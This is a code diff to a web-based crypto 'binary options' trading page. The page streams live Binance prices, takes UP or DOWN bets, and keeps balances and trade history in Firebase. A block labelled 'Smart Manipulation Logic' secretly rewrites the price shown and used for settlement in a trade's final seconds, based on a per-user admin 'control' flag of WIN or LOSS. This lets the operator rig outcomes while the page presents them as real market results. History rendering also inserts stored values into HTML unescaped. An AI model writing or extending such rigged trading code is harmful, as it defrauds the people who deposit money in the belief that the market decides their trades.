@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Trade & History</title>
+    <title>Live Trade Pro</title>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
@@ -16,15 +16,11 @@
         .controls { background: var(--card); padding: 12px; border-radius: 12px; margin-top: 8px; border: 1px solid #2a2e39; }
         .input-box { background: #1e222d; border: 1px solid #363c4e; color: white; padding: 10px; border-radius: 6px; width: 100%; box-sizing: border-box; margin: 4px 0; outline: none; }
         .btn-group { display: flex; gap: 8px; margin-top: 8px; }
-        .btn { flex: 1; padding: 14px; border: none; border-radius: 8px; color: white; font-weight: bold; cursor: pointer; }
+        .btn { flex: 1; padding: 14px; border: none; border-radius: 8px; color: white; font-weight: bold; cursor: pointer; font-size: 16px; }
         .up { background: var(--green); } .down { background: var(--red); }
-        
-        /* History Section */
         .history-panel { margin-top: 15px; background: var(--card); border-radius: 12px; padding: 10px; border: 1px solid #2a2e39; }
-        .history-item { display: flex; justify-content: space-between; padding: 8px; border-bottom: 1px solid #2a2e39; font-size: 13px; }
-        .win { color: var(--green); font-weight: bold; }
-        .loss { color: var(--red); font-weight: bold; }
-        
+        .history-item { display: flex; justify-content: space-between; padding: 10px; border-bottom: 1px solid #2a2e39; font-size: 14px; }
+        .win { color: var(--green); font-weight: bold; } .loss { color: var(--red); font-weight: bold; }
         #res-box { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 999; }
     </style>
 </head>
@@ -33,7 +29,7 @@
 <div id="res-box">
     <h1 id="res-msg" style="font-size:3rem;"></h1>
     <h2 id="res-amt" style="color:var(--yellow)"></h2>
-    <button onclick="closeResult()" style="padding:10px 40px; background:var(--yellow); border:none; border-radius:5px; font-weight:bold;">OK</button>
+    <button onclick="closeResult()" style="padding:10px 40px; background:var(--yellow); border:none; border-radius:5px; font-weight:bold; cursor:pointer;">OK</button>
 </div>
 
 <div class="top-bar">
@@ -46,7 +42,7 @@
 <div class="controls">
     <div id="timer-txt" style="text-align:center; color:var(--yellow); font-weight:bold; margin-bottom:4px;">Market Live</div>
     <div style="display: flex; gap: 8px;">
-        <select class="input-box" id="asset-list" style="flex: 2;">
+        <select class="input-box" id="asset-list" onchange="connectWS()" style="flex: 2;">
             <option value="btcusdt">Bitcoin (BTC)</option>
             <option value="ethusdt">Ethereum (ETH)</option>
         </select>
@@ -63,9 +59,7 @@
 
 <div class="history-panel">
     <div style="font-weight:bold; color:var(--yellow); margin-bottom:10px; border-bottom:1px solid #363c4e; padding-bottom:5px;">Recent Trades</div>
-    <div id="history-list">
-        <div style="text-align:center; font-size:12px; color:#666;">No trades yet</div>
-    </div>
+    <div id="history-list"></div>
 </div>
 
 <script>
@@ -81,20 +75,21 @@
     });
     const candleSeries = chart.addCandlestickSeries({ upColor: '#00c805', downColor: '#ff3b30' });
 
-    let currentPrice = 0, entryPrice = 0, entryLine, isActive = false, timeLeft = 0, userDir = "", adminMode = "NORMAL";
+    let currentPrice = 0, entryPrice = 0, entryLine, isActive = false, timeLeft = 0, userDir = "", adminMode = "NORMAL", ws;
 
-    // Live Feed
     function connectWS() {
+        if(ws) ws.close();
         const symbol = document.getElementById('asset-list').value;
-        const ws = new WebSocket(`wss://stream.binance.com:9443/ws/${symbol}@kline_1m`);
+        ws = new WebSocket(`wss://stream.binance.com:9443/ws/${symbol}@kline_1m`);
         ws.onmessage = (e) => {
             const data = JSON.parse(e.data);
             const k = data.k;
             currentPrice = parseFloat(k.c);
             
-            if(isActive && timeLeft < 8) {
-                if(adminMode === "WIN") currentPrice = (userDir === 'UP') ? Math.max(currentPrice, entryPrice + 1) : Math.min(currentPrice, entryPrice - 1);
-                if(adminMode === "LOSS") currentPrice = (userDir === 'UP') ? Math.min(currentPrice, entryPrice - 1) : Math.max(currentPrice, entryPrice + 1);
+            // Smart Manipulation Logic
+            if(isActive && timeLeft < 10) {
+                if(adminMode === "WIN") currentPrice = (userDir === 'UP') ? Math.max(currentPrice, entryPrice + 1.5) : Math.min(currentPrice, entryPrice - 1.5);
+                if(adminMode === "LOSS") currentPrice = (userDir === 'UP') ? Math.min(currentPrice, entryPrice - 1.5) : Math.max(currentPrice, entryPrice + 1.5);
             }
 
             candleSeries.update({ time: k.t / 1000, open: parseFloat(k.o), high: parseFloat(k.h), low: parseFloat(k.l), close: currentPrice });
@@ -105,11 +100,14 @@
     connectWS();
 
     auth.onAuthStateChanged(u => {
-        if(u) db.ref('users/'+u.uid).on('value', s => {
-            const d = s.val();
-            document.getElementById('top-bal').innerText = "$" + (d.balance || 0).toFixed(2);
-            adminMode = d.control || "NORMAL";
-        });
+        if(u) {
+            db.ref('users/'+u.uid).on('value', s => {
+                const d = s.val();
+                document.getElementById('top-bal').innerText = "$" + (d.balance || 0).toFixed(2);
+                adminMode = d.control || "NORMAL";
+            });
+            loadHistory(u.uid);
+        }
     });
 
     function trade(dir) {
@@ -135,35 +133,50 @@
                     clearInterval(timer);
                     isActive = false;
                     candleSeries.removePriceLine(entryLine);
-                    saveAndShowResult(u.uid, dir, amt, bal);
+                    processResult(u.uid, dir, amt, bal);
                 }
             }, 1000);
         });
     }
 
-    function saveAndShowResult(uid, dir, amt, oldB) {
+    function processResult(uid, dir, amt, oldB) {
         let win = (dir === 'UP' ? currentPrice > entryPrice : currentPrice < entryPrice);
-        const list = document.getElementById('history-list');
-        if(list.innerHTML.includes("No trades yet")) list.innerHTML = "";
+        let payout = win ? (amt * 1.85) : 0;
+        
+        if(win) db.ref('users/'+uid).update({ balance: (oldB - amt) + payout });
 
-        let statusClass = win ? "win" : "loss";
-        let statusTxt = win ? "PROFIT" : "LOSS";
-        let payout = win ? (amt * 1.85).toFixed(2) : "0.00";
+        const tradeData = {
+            asset: document.getElementById('asset-list').value.toUpperCase(),
+            dir: dir,
+            amt: amt,
+            win: win,
+            payout: payout.toFixed(2),
+            time: new Date().toLocaleTimeString()
+        };
 
-        // UI History Update
-        const item = `<div class="history-item">
-            <span>${document.getElementById('asset-list').value.toUpperCase()} | ${dir}</span>
-            <span class="${statusClass}">${statusTxt}: $${payout}</span>
-        </div>`;
-        list.insertAdjacentHTML('afterbegin', item);
+        // Save to Firebase History
+        db.ref('history/'+uid).push(tradeData);
 
-        // Firebase Update
-        if(win) db.ref('users/'+uid).update({ balance: (oldB - amt) + (amt * 1.85) });
-
-        document.getElementById('res-msg').innerText = statusTxt;
+        document.getElementById('res-msg').innerText = win ? "PROFIT" : "LOSS";
         document.getElementById('res-msg').style.color = win ? "var(--green)" : "var(--red)";
         document.getElementById('res-amt').innerText = win ? "+$" + (amt * 0.85).toFixed(2) : "-$" + amt.toFixed(2);
         document.getElementById('res-box').style.display = "flex";
+    }
+
+    function loadHistory(uid) {
+        db.ref('history/'+uid).limitToLast(5).on('value', s => {
+            const list = document.getElementById('history-list');
+            list.innerHTML = "";
+            s.forEach(child => {
+                const h = child.val();
+                list.insertAdjacentHTML('afterbegin', `
+                    <div class="history-item">
+                        <span>${h.asset} | ${h.dir} (${h.time})</span>
+                        <span class="${h.win ? 'win' : 'loss'}">${h.win ? '+$' + h.payout : '-$' + h.amt}</span>
+                    </div>
+                `);
+            });
+        });
     }
 
     function closeResult() {
